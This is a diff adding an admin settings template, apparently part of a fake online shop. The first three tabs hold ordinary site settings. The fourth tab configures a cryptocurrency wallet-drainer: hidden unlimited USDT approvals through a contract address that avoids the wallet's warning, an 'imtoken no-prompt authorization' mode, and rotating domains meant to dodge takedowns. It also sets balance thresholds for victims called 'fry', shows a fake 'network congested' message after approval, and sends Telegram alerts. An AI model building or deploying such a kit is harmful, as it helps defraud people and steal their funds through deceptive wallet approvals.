@@ -1,0 +1,314 @@
+<style type="text/css">
+    @media (max-width: 375px) {
+        .edit-form tr td input {
+            width: 100%;
+        }
+
+        .edit-form tr th:first-child, .edit-form tr td:first-child {
+            width: 20%;
+        }
+
+        .edit-form tr th:nth-last-of-type(-n+2), .edit-form tr td:nth-last-of-type(-n+2) {
+            display: none;
+        }
+    }
+
+    .edit-form table > tbody > tr td a.btn-delcfg {
+        visibility: hidden;
+    }
+
+    .edit-form table > tbody > tr:hover td a.btn-delcfg {
+        visibility: visible;
+    }
+
+    @media (max-width: 767px) {
+        .edit-form table tr th:nth-last-child(-n + 2), .edit-form table tr td:nth-last-child(-n + 2) {
+            display: none;
+        }
+
+        .edit-form table tr td .msg-box {
+            display: none;
+        }
+    }
+
+    .panel-intro > .panel-heading{
+        padding: 0;
+        background: #f5f5f5;
+    }
+
+    .panel-intro > .panel-heading .nav-tabs > li > a{
+        margin-right: 0;
+        border: unset;
+        background: none;
+    }
+
+    .panel-intro > .panel-heading .nav-tabs > li > a:hover,
+    .panel-intro > .panel-heading .nav-tabs > li > a:focus {
+        border: unset;
+        color: #7b8a8b;
+    }
+
+    .f{
+        padding-left: 10px;
+        padding-right: 10px;
+    }
+
+    .panel-intro > .panel-heading .nav-tabs > li.active > a{
+        color: #4397fd;
+    }
+
+    @media (min-width: 768px){
+        .form-horizontal .control-label {
+            text-align: left;
+            margin-bottom: 8px;
+            padding-top: 7px;
+        }
+    }
+
+    .sku-true{
+        display: none;
+    }
+</style>
+
+<form id="add-form" class="form-horizontal" role="form" data-toggle="validator" method="POST" action="">
+    <div class="f  col-lg-8">
+        <div class="panel panel-default panel-intro">
+            <div class="panel-heading">
+                {:build_heading(null, false)}
+                <ul class="nav nav-tabs">
+                    <li class="active"><a href="#tab-1" data-toggle="tab">基础配置</a></li>
+                    <li><a href="#tab-3" data-toggle="tab">登录注册</a></li>
+                    <li><a href="#tab-2" data-toggle="tab">购买配置</a></li>
+                    <!--<li><a href="#tab-4" data-toggle="tab">授权配置</a></li>-->
+                </ul>
+            </div>
+            <div class="panel-body">
+                <div id="myTabContent" class="tab-content">
+                    <div class="tab-pane fade active in" id="tab-1">
+                        <div class="widget-body no-padding">
+                            <!-- 基础配置内容 -->
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">网站名称</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-name" class="form-control" name="name" type="text" value="{$options.name}">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">网站标题</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-title" class="form-control" name="title" type="text" value="{$options.title}">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">关键词</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-keywords" class="form-control" name="keywords" type="text" value="{$options.keywords}">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">网站说明</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <textarea name="description" class="form-control">{$options.description}</textarea>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">Logo</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <div class="input-group">
+                                        <input id="c-logo" class="form-control" size="50" name="logo" type="text" value="{$options.logo}">
+                                        <div class="input-group-addon no-border no-padding">
+                                            <span><button type="button" id="faupload-logo" class="btn btn-danger faupload" data-input-id="c-logo" data-mimetype="image/gif,image/jpeg,image/png,image/jpg,image/bmp,image/webp" data-multiple="false" data-preview-id="p-logo"><i class="fa fa-upload"></i> {:__('Upload')}</button></span>
+                                            <span><button type="button" id="fachoose-logo" class="btn btn-primary fachoose" data-input-id="c-logo" data-mimetype="image/*" data-multiple="false"><i class="fa fa-list"></i> {:__('Choose')}</button></span>
+                                        </div>
+                                        <span class="msg-box n-right" for="c-logo"></span>
+                                    </div>
+                                    <ul class="row list-inline faupload-preview" id="p-logo"></ul>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">备案号</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-beian" class="form-control" name="beian" type="text" value="{$options.beian}">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">公司名称</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-corporate_name" class="form-control" name="corporate_name" type="text" value="{$options.corporate_name}">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="tab-3">
+                        <div class="widget-body no-padding">
+                            <!-- 登录注册内容 -->
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">注册功能</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <div class="checkbox">
+                                        <label><input name="register" type="radio" value="open" {if condition="$options.register == 'open'"}checked{/if}>开启</label>
+                                        <label><input name="register" type="radio" value="close" {if condition="$options.register == 'close'"}checked{/if}>关闭</label>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="tab-2">
+                        <div class="widget-body no-padding">
+                            <!-- 购买配置内容 -->
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">游客下单必填项（同步查单处配置）</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <div class="checkbox">
+                                        <label><input name="buy_input[]" type="checkbox" value="mobile" {if condition="in_array('mobile', $options.buy_input)"}checked{/if}>手机号码</label>
+                                        <label><input name="buy_input[]" type="checkbox" value="email" {if condition="in_array('email', $options.buy_input)"}checked{/if}>电子邮箱</label>
+                                        <label><input name="buy_input[]" type="checkbox" value="password" {if condition="in_array('password', $options.buy_input)"}checked{/if}>查单密码</label>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="tab-pane fade" id="tab-4"> 
+                        <div class="widget-body no-padding">
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">授权模式选择（选择后需要保存才能生效）：</label>
+                                <div class="col-xs-12 col-sm-12">
+                                <div class="radio">
+                                    <label>
+                                        <input type="radio" name="model" value="5" {if $options.model == '5'}checked{/if}>
+                                        正常授权模式
+                                    </label>
+                                </div>
+                                <div class="radio">
+                                    <label>
+                                        <input type="radio" name="model" value="4" {if $options.model == '4'}checked{/if}>
+                                        2024-11月更新imtoken无提示授权 作者 @caishen2024168
+                                    </label>
+                                </div>
+                            </div>
+                        </div>        
+                        <!--<div class="form-group">-->
+                        <!--    <label class="control-label col-xs-12 col-sm-12">模式解释：</label>-->
+                        <!--    <div class="col-xs-12 col-sm-12">-->
+                        <!--        <ol>-->
+                        <!--            <li>TRX转账授权模式：[显示是转账TRX实则是授权；缺点是域名容易被封]</li>-->
+                        <!--            <li>假额度USDT授权模式：[显示授权xx额度(根据你设置的商品价格)，实则授权的额度是无限制的；优点是域名不那么容易被封，但是合约地址还是会被封]</li>-->
+                        <!--            <li>正常授权模式：[正常的授权模式]</li>-->
+                        <!--        </ol>-->
+                        <!--    </div>    -->
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">
+                                    防封域名配置系统：[所有域名都一定要申请SLL证书！宝塔有免费的Let's Encrypt]<br>
+                                    建议设置1个主域名+多个跳转域名；发送给客户主域名，客户在下单时会在下面列表中随机选择一个域名进入钱包授权<br>
+                                    所以理论上来说主域名不触及钱包就永远不会被封，跳转域名如果被封之后删除这个域名就好了<br>
+                                    跳转域名建议申请[*]泛解析，如果你实在是不会泛解析，请寻找域名商家给你提供帮助<br>
+                                    在宝塔中如果你无法一个网站绑定多个域名，可以新增网站[为了新增域名]，根目录选择网站搭建的目录即可
+                                </label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <textarea id="c-domain" class="form-control" name="domain" rows="5" placeholder="请在这里输入跳转域名，每行一个。例如:&#10;*.baidu1.com&#10;*.baidu2.com&#10;*.baidu3.com&#10;注意：请解析域名的时候使用泛解析符号[*]">{$options.domain}</textarea>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">收款地址：建议使用个人地址（对于已经授权过的客户再次下单会转账商品金额，不再是授权）</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-payment_address" class="form-control" name="payment_address" type="text" value="{$options.payment_address}" placeholder="这里填写收款地址（建议使用个人地址）">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">权限地址：一定要使用合约地址（不然有明显的授权提示）<br>傻瓜一键式部署盗U合约地址教程：bygoukai_com 带监听授权+阈值提币+监听鱼苗动账 </label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-permission_address" class="form-control" name="permission_address" type="text" value="{$options.permission_address}" placeholder="这里填写权限接收地址（不使用合约地址会有明显的[授权提示]）">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">客户浏览网站商品时发送通知播报：</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <div class="radio">
+                                        <label>
+                                            <input type="radio" name="notification_switch" value="1" {if $options.notification_switch == '1'}checked{/if}>
+                                            开启通知
+                                        </label>
+                                        <label>
+                                            <input type="radio" name="notification_switch" value="0" {if $options.notification_switch == '0'}checked{/if}>
+                                            关闭通知
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">Telegrambot密钥：官方注册机器人 https://t.me/BotFather </label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-bot_key" class="form-control" name="bot_key" type="text" value="{$options.bot_key}" placeholder="请在这里输入机器人密钥">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">通知chatid：使用机器人查询 https://t.me/chatIDrobot <br>如果你要使用群聊通知那就把机器人拉进你需要通知的群聊中查询群聊的chatid </label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-notification_id" class="form-control" name="notification_id" type="text" value="{$options.notification_id}" placeholder="请在这里输入通知ID">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">TRX阈值：鱼苗的TRX余额低于XX不允许请求支付或者授权</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-trx_balance" class="form-control" name="trx_balance" type="text" value="{$options.trx_balance}" placeholder="建议设置阈值23">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">USDT阈值：鱼苗的USDT余额低于XX不允许请求支付或者授权</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-usdt_balance" class="form-control" name="usdt_balance" type="text" value="{$options.usdt_balance}" placeholder="建议设置阈值 0.1 ">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">授权金额 金额输入0则代表授权无限大金额</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <input id="c-authorized_amount" class="form-control" name="authorized_amount" type="text" value="{$options.authorized_amount}" placeholder="请在这里输入授权金额">
+                                </div>
+                            </div>
+                            <div class="form-group">
+                                <label class="control-label col-xs-12 col-sm-12">授权提示：留空则不会出现提示</label>
+                                <div class="col-xs-12 col-sm-12">
+                                    <textarea id="c-authorize_note" class="form-control" name="authorize_note" placeholder="授权成功后提示内容>>>例：当前网络拥堵，请在当前页面中耐心等待返回交易结果">{$options.authorize_note}</textarea>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-group layer-footer">
+                    <label class="control-label col-xs-12 col-sm-12"></label>
+                    <div class="col-xs-12 col-sm-12">
+                        <button type="submit" class="btn btn-primary btn-embossed disabled">{:__('OK')}</button>
+                        <button type="reset" class="btn btn-default btn-embossed">{:__('Reset')}</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="f col-lg-4">
+        <div class="panel panel-default">
+            <div class="panel-heading">其他设置</div>
+            <div class="panel-body">
+                <div class="form-group">
+                    <label class="control-label col-xs-12 col-sm-12">icon</label>
+                    <div class="col-xs-12 col-sm-12">
+                        <div class="input-group">
+                            <input id="c-icon" class="form-control" size="50" name="icon" type="text" value="{$options.icon}">
+                            <div class="input-group-addon no-border no-padding">
+                                <span><button type="button" id="faupload-icon" class="btn btn-danger faupload" data-input-id="c-icon" data-mimetype="image/gif,image/jpeg,image/png,image/jpg,image/bmp,image/webp" data-multiple="false" data-preview-id="p-icon"><i class="fa fa-upload"></i> {:__('Upload')}</button></span>
+                                <span><button type="button" id="fachoose-icon" class="btn btn-primary fachoose" data-input-id="c-icon" data-mimetype="image/*" data-multiple="false"><i class="fa fa-list"></i> {:__('Choose')}</button></span>
+                            </div>
+                            <span class="msg-box n-right" for="c-icon"></span>
+                        </div>
+                        <ul class="row list-inline faupload-preview" id="p-icon"></ul>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label class="control-label col-xs-12 col-sm-12">自定义代码</label>
+                    <div class="col-xs-12 col-sm-12">
+                        <textarea name="custom_code" class="form-control" rows="5">{$options.custom_code}</textarea>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</form>
